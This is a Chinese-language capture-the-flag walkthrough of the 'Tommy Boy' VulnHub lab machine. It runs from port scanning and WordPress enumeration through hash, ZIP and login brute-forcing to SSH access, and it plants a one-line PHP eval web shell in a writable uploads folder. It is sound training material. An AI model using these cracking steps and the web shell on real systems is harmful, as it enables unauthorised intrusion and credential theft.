## port scan

```sh
# Nmap 7.94SVN scan initiated Wed Feb 12 01:56:15 2025 as: nmap -sT --min-rate=8899 -p- -oN nmap_result/port 192.168.56.149
Nmap scan report for 192.168.56.149 (192.168.56.149)
Host is up (0.013s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8008/tcp open  http
```

```sh
# Nmap 7.94SVN scan initiated Wed Feb 12 01:56:50 2025 as: nmap -sT -sC -sV -O -p22,80,8008 -oN nmap_result/detils 192.168.56.149
Nmap scan report for 192.168.56.149 (192.168.56.149)
Host is up (0.0010s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 (RSA)
|   256 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 (ECDSA)
|_  256 56:9e:71:2a:a3:83:ff:63:11:7e:94:08:dd:28:1d:46 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to Callahan Auto
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 4 disallowed entries 
| /6packsofb...soda /lukeiamyourfather 
|_/lookalivelowbridge /flag-numero-uno.txt
8008/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: KEEP OUT
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 08:00:27:B8:5C:38 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## web

查看`index.html`源代码

```
Comment from Nick: backup copy is in Big Tom's home folder
Comment from Richard: can you give me access too? Big Tom's the only one w/password
Comment from Nick: Yeah yeah, my processor can only handle one command at a time
Comment from Richard: please, I'll ask nicely
Comment from Nick: I will set you up with admin access *if* you tell Tom to stop storing important information in the company blog
Comment from Richard: Deal.  Where's the blog again?
Comment from Nick: Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It's here if you don't remember: https://www.youtube.com/watch?v=VUxOd4CszJ8 
Comment from Richard: Ah! How could I forget?  Thanks
```

`robots.txt`

```sh
curl http://192.168.56.149/robots.txt
User-agent: *
Disallow: /6packsofb...soda
Disallow: /lukeiamyourfather
Disallow: /lookalivelowbridge
Disallow: /flag-numero-uno.txt
```

第一个`flag`

```sh
┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ curl http://192.168.56.149/flag-numero-uno.txt      
This is the first of five flags in the Callhan Auto server.  You'll need them all to unlock
the final treasure and fully consider the VM pwned!

Flag data: B34rcl4ws
```

查看视频里的内容`prehistoric forest`

`http://192.168.56.149/prehistoricforest/`

枚举wordpress

```
cmseek -u http://192.168.56.149/prehistoricforest/
```

![image-20250212192744628](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212192744628.png)

![image-20250212192904077](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212192904077.png)

第二个`flag`

```sh
┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ curl http://192.168.56.149/prehistoricforest/thisisthesecondflagyayyou.txt
You've got 2 of five flags - keep it up!

Flag data: Z4l1nsky
```

继续查看wordpress

![image-20250212203216373](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212203216373.png)

```sh
┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ wget http://192.168.56.149/richard/shockedrichard.jpg
--2025-02-12 07:32:35--  http://192.168.56.149/richard/shockedrichard.jpg

┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ strings shockedrichard.jpg 
JFIF
Exif
Google
Copyright 
 1995 Paramount Pictures Corporation. Credit: 
 1995 Paramount Pictures / Courtesy: Pyxurz.
0220
ASCII
ce154b5a8e59c89732bc25d6a2e6b90b
```

`ce154b5a8e59c89732bc25d6a2e6b90b`爆破hash，spanky

![image-20250212203411230](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212203411230.png)

输入密码`spanky`

有个FTP服务，在高端口，并且服务器似乎每小时上线 15 分钟，然后下线 15 分钟，再上线，再下线。

![image-20250212193156393](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212193156393.png)

还存在`nickburns`账户只有ftp权限

```sh
└─$ nmap --min-rate=1000 -p- 192.168.56.149 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 06:33 EST
Nmap scan report for 192.168.56.149 (192.168.56.149)
Host is up (0.012s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8008/tcp  open  http
65534/tcp open  unknown
```

```sh
sudo nmap -sT -sC -sV -O -p22,80,8008,65534 192.168.56.149                 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 06:34 EST
Nmap scan report for 192.168.56.149 (192.168.56.149)
Host is up (0.0042s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 (RSA)
|   256 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 (ECDSA)
|_  256 56:9e:71:2a:a3:83:ff:63:11:7e:94:08:dd:28:1d:46 (ED25519)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 4 disallowed entries 
| /6packsofb...soda /lukeiamyourfather 
|_/lookalivelowbridge /flag-numero-uno.txt
|_http-title: Welcome to Callahan Auto
|_http-server-header: Apache/2.4.18 (Ubuntu)
8008/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: KEEP OUT
65534/tcp open  ftp     ProFTPD 1.2.10
MAC Address: 08:00:27:B8:5C:38 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**ftp**

`nickburns:nickburns`账户

```sh
ftp 192.168.56.149 65534                                       
Connected to 192.168.56.149.
220 Callahan_FTP_Server 1.3.5
Name (192.168.56.149:kali): nickburns
331 Password required for nickburns
Password: 
230 User nickburns logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||11049|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 nickburns nickburns      977 Jul 15  2016 readme.txt
226 Transfer complete
ftp> get readme.txt
```

```
To my replacement:

If you're reading this, you have the unfortunate job of taking over IT responsibilities
from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You'll be
surrounded by stupid monkeys all day who can barely hit Ctrl+P and wouldn't know a fax machine
from a flame thrower!

Anyway I'm not completely without mercy.  There's a subfolder called "NickIzL33t" on this server
somewhere. I used it as my personal dropbox on the company's dime for years.  Heh. LOL.
I cleaned it out (no naughty pix for you!) but if you need a place to dump stuff that you want
to look at on your phone later, consider that folder my gift to you.

Oh by the way, Big Tom's a moron and always forgets his passwords and so I made an encrypted
.zip of his passwords and put them in the "NickIzL33t" folder as well.  But guess what?
He always forgets THAT password as well.  Luckily I'm a nice guy and left him a hint sheet.

Good luck, schmuck!

LOL.

-Nick
```

存在一个子目录`NickIzL33t`

```
curl http://192.168.56.149:8008/NickIzL33t/                               
<H1>Nick's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content</H1><H2>Lol</H2>
```

史蒂夫·乔布斯 iPhone创始人，可能需要设置`iPhone`设备的UA,才能访问

![image-20250212194039301](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212194039301.png)

`Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.111 Mobile/15E148 Safari/604.1`

```
Well, you passed the dummy test
你通过了假人测试
But Nick's secret door isn't that easy to open.
但尼克的秘密之门并不那么容易打开。
Gotta know the EXACT name of the .html to break into this fortress.
必须知道 .html 的确切名称，才能闯入这座堡垒。
Good luck brainiac.  祝你好运
Lol  笑
-Nick   -尼克
```

继续fuzz html页面

```sh
wfuzz -H "User-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.111 Mobile/15E148 Safari/604.1" -z file,/usr/share/wordlists/rockyou.txt --hc 404 --hh 270 http://192.168.56.149:8008/NickIzL33t/FUZZ.html
```

```sh
ffuf -w /usr/share/wordlists/rockyou.txt -u http://192.168.56.149:8008/NickIzL33t/FUZZ.html -c -v -H 'User-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.111 Mobile/15E148 Safari/604.1' -fs 94,270
```

![](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212201344781.png)

```sh
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.149:8008/NickIzL33t/FUZZ.html
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.111 Mobile/15E148 Safari/604.1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 94,270
________________________________________________

[Status: 200, Size: 459, Words: 56, Lines: 13, Duration: 13ms]
| URL | http://192.168.56.149:8008/NickIzL33t/fallon1.html
    * FUZZ: fallon1
```

```
http://192.168.56.149:8008/NickIzL33t/fallon1.html
```

![image-20250212201545808](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212201545808.png)

```
http://192.168.56.149:8008/NickIzL33t/flagtres.txt
```

第三个`flag`

```
THREE OF 5 FLAGS - you're awesome sauce.

Flag data: TinyHead
```

```
http://192.168.56.149:8008/NickIzL33t/hint.txt
```

```
Big Tom,

Your password vault is protected with (yep, you guessed it) a PASSWORD!  
And because you were choosing stupidiculous passwords like "password123" and "brakepad" I
enforced new password requirements on you...13 characters baby! MUAHAHAHAHAH!!!

Your password is your wife's nickname "bev" (note it's all lowercase) plus the following:

* One uppercase character
* Two numbers
* Two lowercase characters
* One symbol
* The year Tommy Boy came out in theaters

Yeah, fat man, that's a lot of keys to push but make sure you type them altogether in one 
big chunk ok?  Heh, "big chunk."  A big chunk typing big chunks.  That's funny.

LOL

-Nick
```

`http://192.168.56.149:8008/NickIzL33t/t0msp4ssw0rdz.zip`

生成密码本，爆破压缩包

```
crunch 13 13 -t bev,%%@@^1995 > pass.list
```

```sh
┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ zip2john t0msp4ssw0rdz.zip > zip.hash
ver 2.0 efh 5455 efh 7875 t0msp4ssw0rdz.zip/passwords.txt PKZIP Encr: TS_chk, cmplen=332, decmplen=641, crc=DF15B771 ts=9AAD cs=9aad type=8

┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ cat zip.hash          
t0msp4ssw0rdz.zip/passwords.txt:$pkzip$1*1*2*0*14c*281*df15b771*0*47*8*14c*9aad*1111ae595866e07b84f85c20e92c72c25ed0d5bb719d8e06810dd37882daea9506f3f8b3f1a878c1dbeddbc09b2dc224cc622df1db947a021101c07f703ce09f32a1486fd2c49fce2c19354f546fae56e55bd30ce1b7962c74cba12dd83fe568e7519a1bda9c035986f98ab8a4af79d2344984f83106bea57349cab167fe2952ba4e26a170b916e8a604175602d4967d147a95e2252a7a55f9c44829e41fdf7f5757ead5d959a2d18ab90603a15aeaf1ba15d09e1467f10f6b7237545665b2cebaf7b8b671fa75d26027cde8607bcdca2d8beb790b5bcd3d51590e8fbe4f1f5117a432c99318c434124dfdabfa08157ab20e313f2c5b630684fe1e7d758e895d4b7d6b17d7fc470ac88acadea681c5dcc957b510c5faaed5605f852c6b74de1d20d25f664e82907b9f1a9e8eaa925dd7972bef07daea2be4cec338961754e66a6f155cba85e64080a86d181f*$/pkzip$:passwords.txt:t0msp4ssw0rdz.zip::t0msp4ssw0rdz.zip

┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ john zip.hash --wordlist=pass.list 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bevH00tr$1995    (t0msp4ssw0rdz.zip/passwords.txt)     
1g 0:00:00:01 DONE (2025-02-12 07:25) 0.8849g/s 13843Kp/s 13843Kc/s 13843KC/s bevH00re{1995..bevH01fm.1995
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

密码:`bevH00tr$1995`

```sh
┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ fcrackzip -v -u -D -p pass.list t0msp4ssw0rdz.zip
found file 'passwords.txt', (size cp/uc    332/   641, flags 9, chk 9aad)
checking pw bevC68za^1995                                                                              

PASSWORD FOUND!!!!: pw == bevH00tr$1995
```

解压压缩包

```sh
┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ unzip t0msp4ssw0rdz.zip                            
Archive:  t0msp4ssw0rdz.zip
[t0msp4ssw0rdz.zip] passwords.txt password: 
  inflating: passwords.txt           

┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ cat pass  
cat: pass: No such file or directory
                                                                                                                                                                          
┌──(kali㉿kali)-[~/vulnhub/TommyBoy]
└─$ cat passwords.txt 
Sandusky Banking Site
------------------------
Username: BigTommyC
Password: money

TheKnot.com (wedding site)
---------------------------
Username: TomC
Password: wedding

Callahan Auto Server
----------------------------
Username: bigtommysenior
Password: fatguyinalittlecoat

Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.

Callahan Company Blog
----------------------------
Username: bigtom(I think?)
Password: ??? 
Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
```

密码：`fatguyinalittlecoat`后面还有数字

枚举wordpress，有四个用户

```
michelle
richard
tom
tommy
```

```
wpscan --url http://192.168.56.149/prehistoricforest/ -U wordpress_users -P /usr/share/wordlists/rockyou.txt
```

![image-20250212204750272](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212204750272.png)

`tom:tomtom1`

登录到后台

发现了后半部分的密码：`1938!!`



![image-20250212204644823](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212204644823.png)

完整的密码：

```
Username: bigtommysenior
Password: fatguyinalittlecoat1938!!
```

## shell as user

ssh登录到系统

![image-20250212205004079](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212205004079.png)

第四个`flag`

```sh
bigtommysenior@CallahanAutoSrv01:~$ cat el-flag-numero-quatro.txt 
YAY!  Flag 4 out of 5!!!! And you should now be able to restore the Callhan Web server to normal
working status.

Flag data: EditButton

But...but...where's flag 5?  

I'll make it easy on you.  It's in the root of this server at /5.txt
```

提示，根目录存在5.txt

```sh
bigtommysenior@CallahanAutoSrv01:/$ ls -la
total 105
drwxr-xr-x  25 root     root      4096 Jul 15  2016 .
drwxr-xr-x  25 root     root      4096 Jul 15  2016 ..
-rwxr-x---   1 www-data www-data   520 Jul  7  2016 .5.txt
```

查找可写文件

```sh
bigtommysenior@CallahanAutoSrv01:/$ find / -writable 2>/dev/null | grep -v 'proc' | grep -v 'sys' | grep -v 'dev'
/var/lib/php/sessions
/var/crash
/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads
/var/www/html/index.html
/var/www/html/ca.jpeg
/var/lock
/var/tmp
```

```sh
bigtommysenior@CallahanAutoSrv01:/$ ls -l /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/
total 16
-rw-r--r-- 1 root     root     1603 Jul 15  2016 backupload.php
-rw-r--r-- 1 root     root      280 Jul 15  2016 index.html
-rw-r--r-- 1 root     root     1615 Jul 15  2016 upload.php
drwxrwxrwx 2 www-data www-data 4096 Feb 12 10:51 uploads
```

`uploads`文件夹有写权限

```sh
bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads$ cat 1.php
<?php eval($_POST[1]);
```

```
http://192.168.56.149:8008/NickIzL33t/P4TCH_4D4MS/uploads/1.php
```

![image-20250212205837677](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212205837677.png)

`.5.txt`

```sh
FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
OH RICHARD DON'T RUN AWAY FROM YOUR FEELINGS!!!!!!!!

Flag data: Buttcrack

Ok, so NOW what you do is take the flag data from each flag and blob it into one big chunk.
So for example, if flag 1 data was "hi" and flag 2 data was "there" and flag 3 data was "you"
you would create this blob:

hithereyou

Do this for ALL the flags sequentially, and this password will open the loot.zip in Big Tom's
folder and you can call the box PWNED.
```

密码连接起来就是：`B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack`

解压`LOOT.ZIP`

```sh
bigtommysenior@CallahanAutoSrv01:~$ unzip LOOT.ZIP 
Archive:  LOOT.ZIP
[LOOT.ZIP] THE-END.txt password: 
  inflating: THE-END.txt             
bigtommysenior@CallahanAutoSrv01:~$ cat THE-END.txt 
YOU CAME.
YOU SAW.
YOU PWNED.

Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.

GREAT WORK!

I'd love to know that you finished this VM, and/or get your suggestions on how to make the next 
one better.

Please shoot me a note at 7ms @ 7ms.us with subject line "Here comes the meat wagon!"

Or, get in touch with me other ways:

* Twitter: @7MinSec
* IRC (Freenode): #vulnhub (username is braimee)

Lastly, please don't forget to check out www.7ms.us and subscribe to the podcast at
bit.ly/7minsec

</shamelessplugs>

Thanks and have a blessed week!

-Brian Johnson
7 Minute Security
```

到此5个flag全部拿到，靶机结束